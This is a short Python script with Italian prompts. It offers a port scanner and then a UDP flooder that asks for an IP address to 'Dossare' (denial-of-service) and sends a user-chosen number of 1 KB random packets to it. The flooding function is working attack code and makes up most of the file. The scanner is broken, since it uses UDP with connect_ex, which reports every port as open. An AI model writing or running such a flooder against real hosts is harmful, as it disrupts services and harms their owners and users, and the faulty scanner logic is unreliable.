import socket as so
import random as rdm #per i dati da mettere nei pacchetti

def port_scanner():
    ip_target = input("Inserisci l'indirizzo IP da controllare\n>>>")
    port_range = input("Inserisci un intervallo di porte da controllare, esempio: 5-200\n>>>")
    low_port = int (port_range.split("-")[0])
    high_port = int (port_range.split("-")[1])
    print(f"Controlleremo dalla porta {low_port} alla porta {high_port}")
    for port in range(low_port, high_port+1):
        s = so.socket(so.AF_INET, so.SOCK_DGRAM)
        status = s.connect_ex((ip_target, port))
        if(status == 0):
            print(f"*** Porta {port} - Aperta ***")
        else:
            print(f"*** Porta {port} - Chiusa ***")
        s.close

def invio_pacchetti_UDP():
    IP_target = input("Inserisci l'indirizzo IP da Dossare\n>>>")
    porta_target = int(input("Inserisci la porta del sistema target\n>>>"))
    s_UDP = so.socket(so.AF_INET, so.SOCK_DGRAM)
    pacchetto_UDP = rdm.randbytes(1024)
    # creazione di un pacchetto da 1 KB
    numero_pacchetti = int(input("Quanti pacchetti vuoi inviare?\n>>>"))
    for i in range(numero_pacchetti):
        s_UDP.sendto(pacchetto_UDP, (IP_target, porta_target))
        print (f"Pacchetto inviato all'indirizzo {IP_target} sulla porta {porta_target}")

print("Questo programma serve per inviare pacchetti UDP ad uno specifico indirizzo IP")
menu=int(input("Conosci una porta aperta dell'indirizzo IP a cui vuoi inviare i pacchetti?\n1) Si\n2) No, voglio scoprirlo\n>>>"))
if menu == 1:
    invio_pacchetti_UDP()
elif menu == 2:
    port_scanner()
    invio_pacchetti_UDP()
else:
    print("Comando non Valido")  